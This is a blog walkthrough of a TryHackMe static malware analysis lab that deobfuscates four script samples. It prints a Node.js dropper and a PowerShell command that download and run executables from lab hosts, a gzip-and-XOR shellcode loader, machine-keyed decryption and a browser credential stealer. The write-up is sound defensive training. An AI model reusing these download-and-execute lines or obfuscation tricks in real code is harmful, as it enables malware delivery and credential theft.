---
title: "TryHackMe Script Static Analysis: Four Scripts, One PowerShell Prompt"
date: 2026-08-29T18:39:00+05:30
lastmod: 2026-08-29T18:39:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-scriptstatic/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SOC Level 2
  - Malware Analysis
  - Static Analysis
  - PowerShell
  - JavaScript
  - Deobfuscation
  - Cobalt Strike
  - GlassWorm
  - Blue Team

draft: false
description: "TryHackMe Script Static Analysis walkthrough: a Node.js dropper among 253 decoys, shellcode gzipped before the XOR, a MachineGuid-keyed payload, and GlassWorm."
---

## Script Static Analysis

Room 4 of 6 in the **Static Malware Analysis** module on SOC Level 2, and the one that finally admits most of what lands in a SOC queue is not a PE file. [Basic Static Analysis](/post/thm-room-staticanalysis1/) was six unlabelled binaries and a rule against running them. This room is four text files: a Node.js library, a `.cmd` one-liner, a PowerShell injector and a 769 KB JavaScript RAT. Nothing here needs a disassembler. All of it needs patience with obfuscation.

The lab is a Windows box with VS Code, Notepad++ and a local CyberChef on the desktop, and samples in `C:\Users\Administrator\Desktop\Tasks`. I ended up using none of the GUI tools. Everything below came out of a single PowerShell prompt, partly by preference and largely because the remote session made anything else impractical. More on that at the end, because it changed how I worked and it is the sort of thing worth writing down.

## Task 2: Why scripts

One knowledge question. The program that parses script code and translates it into machine instructions is an **interpreter**, which is the whole reason attackers like scripts: the interpreter is already installed, signed and trusted, so there is no binary to get flagged.

## Task 3: Finding one function among 253

The first sample, `utils.js`, is a Node.js "utility library" of 4,150 lines and 253 functions. The noise is generated, and generated noise has a tell. Every decoy is named `<word><Word><Word><number>`: `weightedSampleRegistry1`, `deepEqualShard2`, `retryCache5`, on and on to 150-something.

```powershell
# 253 functions, and every decoy ends in a digit
$c = gc .\utils.js -Raw
$n = [regex]::Matches($c,'function\s+([A-Za-z0-9_$]+)') | %{ $_.Groups[1].Value }
$n.Count                              # 253
$n | ?{ $_ -notmatch '[0-9]$' }       # calcSize
```

That filter returns exactly one name: `calcSize`. It is also the wrong answer, and the reason it is wrong is the nicest bit of design in the room. `calcSize` is a real, working averaging function that the author planted **inside** the malicious function specifically so that a name-based scan lands on something harmless. The actual dropper is `collectDiagnostics127`, which hides by obeying the naming convention perfectly.

The author question has a similar shape. Searching for `author` returns nothing, because the attribution sits in a JSDoc header as a copyright line:

```
/**
 * @license  MIT
 * Copyright (c) 2026 Kevin McCallister
 * @file utils.js
 * @description Contains utility functions to simplify the ML-focused development
 */
```

**Kevin McCallister**, which is a Home Alone joke and a reminder that the metadata in a malicious file is whatever the author felt like typing.

## Task 4: Two droppers, two obfuscation styles

The whole payload is fifteen lines, and it uses three separate tricks to keep any single string from being greppable.

![PowerShell dump of utils.js lines 3151 to 3166 showing the collectDiagnostics127 function, the reordered dest array, the base64 constant, the decoy calcSize function, and the https.get to exec chain](/img/thm-scriptstatic/01-utils-payload.png)

Reading it out:

```javascript
const dest = ((a) => [a[1], a[0], a[2]].join(""))(["dog.e", "watch", "xe"]);
const b    = "ZXhlLmEvbWh0LnNjaXRzb25nYWlkLWhzYXJjLy86c3B0dGg=";
const buff = Buffer.from(b, "base64").toString("utf8");
const site = buff.split("").reverse().join("");
const stream = fs.createWriteStream(dest);
https.get(site, (res) => res.pipe(stream));
file.on("finish", () => exec(dest));
```

The filename is split into three fragments and reassembled out of order, so `["dog.e","watch","xe"]` indexed `[1],[0],[2]` gives **watchdog.exe**. The URL is base64 **and then reversed**, so decoding alone produces the nonsense `exe.a/mht.scitsongaid-hsarc//:sptth`; reversing that gives **https://crash-diagnostics.thm/a.exe**. Neither the hostname nor the filename exists as a contiguous string anywhere in the file.

`loader.cmd` is the same idea in PowerShell. It is a single `powershell -enc` line, and the decoded UTF-16LE payload leans entirely on character codes and the `-f` format operator:

```powershell
$FVxW5Yh7BJ = "$([char]0x70+[char]0x73+[char]0x78+[char]0x68+[char]0x31+
               [char]0x37+[char]0x2e+[char]0x74+[char]0x68+[char]0x6d)"   # psxh17.thm
$ktbN3qJcKWIaVrQ  = "/{2}.{0}{0}" -f 'e','dpe','upd'                      # /upd.exe
$YuKW4rBRLPRv02E1 = "{2}:/{1}{0}" -f 'Data','Program','c'                 # c:/ProgramData
$FVxW5Yh7BJ = "htt`p`s`:`/`/{0}" -f $FVxW5Yh7BJ
(New-Object System.Net.WebClient).DownloadFile($FVxW5Yh7BJ + $ktbN3qJcKWIaVrQ,
                                               $YuKW4rBRLPRv02E1 + $ktbN3qJcKWIaVrQ)
```

Download **https://psxh17.thm/upd.exe** into **C:\ProgramData\upd.exe**. Note the backticks in the scheme: `htt` + backtick + `p` and so on. PowerShell strips them at parse time, so the string `https://` never appears in the file for a signature to match, and neither does `ProgramData`.

{{< ad >}}

## Task 5: The gzip step that is easy to skip

`shellcode.ps1` is a 229 KB PowerShell injector. The XOR key is visible in plain sight in the loop, `33` in decimal, and it is tempting to go straight from "base64 blob" to "XOR it and hash it". That produces the wrong answer, because reading the actual injector shows a stage in between:

```powershell
$s = New-Object System.IO.MemoryStream(,New-Object System.IO.Compression.GZipStream(
        (New-Object System.IO.MemoryStream(,$var_byte)),
        [System.IO.Compression.CompressionMode]::Decompress))
$var_code = $s.ToArray()

for ($x = 0; $x -lt $var_code.Count; $x++) {
    $var_code[$x] = $var_code[$x] -bxor 33
}
```

Base64, then **gzip decompress**, then XOR. Rebuilding that chain gives 307,200 bytes:

```powershell
$t = [regex]::Match((gc .\shellcode.ps1 -Raw),'[A-Za-z0-9+/=]{500,}').Value
$b = [Convert]::FromBase64String($t)
$m = [IO.Compression.CompressionMode]::Decompress
$i = New-Object IO.MemoryStream(,$b)
$g = New-Object IO.Compression.GZipStream($i,$m)
$o = New-Object IO.MemoryStream
$g.CopyTo($o)
$c = $o.ToArray()
for($j=0;$j -lt $c.Count;$j++){ $c[$j] = $c[$j] -bxor 33 }
```

![PowerShell output showing the decompressed shellcode length of 307200 bytes and the MD5 hash 27b0d51406b5360b49d968d69df0f3e6](/img/thm-scriptstatic/02-shellcode-md5.png)

Length **307200**, MD5 **27b0d51406b5360b49d968d69df0f3e6**. A 300 KB stageless payload is already a strong hint, and the answer mask (six characters, space, six characters) closes it: **Cobalt Strike**.

One PowerShell gotcha worth noting if you follow along. `New-Object IO.Compression.GZipStream($i,0)` fails with "Multiple ambiguous overloads found ... argument count 2" because the integer will not bind to the enum. Pass `[IO.Compression.CompressionMode]::Decompress` explicitly. The silent version of that failure is worse: if the stream never initialises, `$c` ends up empty and the MD5 comes back `d41d8cd98f00b204e9800998ecf8427e`, which is the hash of nothing at all. If you ever see that hash in an analysis, you have hashed an empty buffer, not a payload.

## Task 6: A payload that only decrypts on one machine

`keyed.ps1` is 413 bytes and is the most interesting sample in the room. It derives its key from the victim host itself:

![PowerShell showing keyed.ps1 deriving SHA256 of the MachineGuid registry value, the machine GUID c5d2b969-b61a-4159-8f78-6391a1c805db, and the decrypted flag THM keyed with machine guid](/img/thm-scriptstatic/03-keyed-flag.png)

```powershell
$mk = [SHA256]::Create().ComputeHash(
        [Encoding]::UTF8.GetBytes(
          (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid).MachineGuid))
$bytes[$i] -bxor $mk[$i % $mk.Length]
```

The key is `SHA256(MachineGuid)`, so the value used to derive it is the **MachineGuid**, on this box `c5d2b969-b61a-4159-8f78-6391a1c805db`. Repeating the XOR gives `THM{keyed_with_machine_guid!}`.

This is MITRE **T1480.001, Environmental Keying**, and it is the reason "just detonate it in a sandbox" is not always an option. Lift this file off the host and the blob is undecryptable, because the key never travels with it. Your sandbox has a different MachineGuid, so the payload silently produces garbage and the sample looks inert.

Two small traps in this one. The script as shipped ends with `Write-Host "Secret bytes: $(bytes)"`, which is a bug (`bytes` is not a command, and the variable is `$out`), so running it as-is tells you nothing. And `$out` is an array of integers, not characters, so you have to cast each byte with `[char]` to get readable text back.

## Task 7: Attributing the RAT

`rat.js` is 769 KB, and almost all of it is bundled npm libraries. Three greps found the implant.

Searching for remote-desktop keywords lands on a cluster of socket.io task handlers around line 21260: `start_hvnc`, `stop_hvnc`, `hvnc_run`. That is **HVNC**, hidden VNC, which paints a full graphical desktop for the attacker on a virtual desktop the user never sees, so nothing appears on their screen and nothing shows in their taskbar.

The infostealer is a separate block near line 20813:

```javascript
function extractAllBrowsers(options = {}) {
  const browsers = ['chrome', 'edge', 'brave', 'opera', 'operagx', 'vivaldi'];
  for (const browser of browsers) {
    if (addon.isBrowserInstalled(browser)) {
      const results = extractAllProfiles(browser, options);
      allResults.push(...results);
    }
  }
  if (addon.isBrowserInstalled('firefox')) { /* separate path */ }
}
```

**extractAllBrowsers** is the main function, at eighteen characters exactly matching the answer mask. Firefox gets its own branch because it does not use the Chromium `Local State` key scheme.

For the family name, the room wants OSINT rather than more reading. Two artefacts do the work. Dumping every distinct C2 task type gives the command vocabulary:

![PowerShell output listing distinct socket.io task types including start_hvnc, stop_hvnc, start_socks, stop_socks, ping, message and upgrade](/img/thm-scriptstatic/04-rat-tasktypes.png)

`start_hvnc` and `start_socks` together are distinctive: the second one turns the victim into a SOCKS proxy node so the operator can route further attacks through their IP. And sweeping the file for URLs turns up a wall of Solana RPC providers (`api.mainnet-beta.solana.com`, `solana.drpc.org`, `blockeden.xyz`, `getblock.us`, `onfinality.io`, `pocket.network`, `tatum.io`, `publicnode.com`) alongside `socket.io`.

A Node.js RAT that reads its C2 address from the Solana blockchain as a dead drop, offers HVNC and SOCKS, and steals browser secrets, is **GlassWorm**. The blockchain dead drop is the clever part operationally: there is no domain to sinkhole and no registrar to serve, because the operator just writes a new address into a chain transaction and every implant picks it up on the next poll.

## The lab, honestly

The room is well built. The VM was not, at least not on this run, and pretending otherwise would be useless to anyone following along.

The Guacamole remote session **stops repainting the canvas long before it stops accepting input**. A screenshot showing an unchanged screen is not evidence your keystroke was dropped. Reloading `tryhackme.com/fullscreen-vms/<n>` forces a fresh frame, and the commands you thought were lost are all there, already run. That single realisation is the difference between abandoning the room and finishing it.

Later the window manager stopped honouring clicks entirely. Taskbar clicks landed on whatever window was on top, Alt+Tab only toggled between two windows, Alt+Escape did nothing. The way out was **Ctrl+Shift+Escape, then File, then Run new task**, and launching `powershell -NoExit -Command "cd $env:USERPROFILE\Desktop\Tasks"`. A newly spawned console owns focus on creation, so it sidesteps the broken window manager completely.

Last one: long typed command blocks get individual characters dropped. `Compression` became `Compreeam`, `Security` became `Selurity`, `[Math]` became `[M}`. These corrupt commands in ways that produce confusing errors rather than obvious ones. One short statement per line lands cleanly. Everything in this writeup was typed that way.

## Two things worth keeping

**The odd one out is often the decoy.** Filtering 253 generated function names down to the single one that breaks the pattern is exactly the right instinct, and in this room it hands you `calcSize`, which is deliberate bait sitting inside the real dropper. Naming conventions are attacker-controlled. Confirm a function by what it does, `https.get` into `exec` in this case, not by how its name reads next to its neighbours.

**Read the decoder before rebuilding it.** The XOR key in `shellcode.ps1` is visible immediately, which makes it easy to assume base64 then XOR and skip the gzip stage in between. The cost of assuming is a wrong hash that still looks like a plausible hash. Transcribe the sample's own decode chain in order, then reimplement it, and check the output length looks like code rather than an empty buffer before you hash anything.

Room solved 100%: 8 tasks, 17 answers.
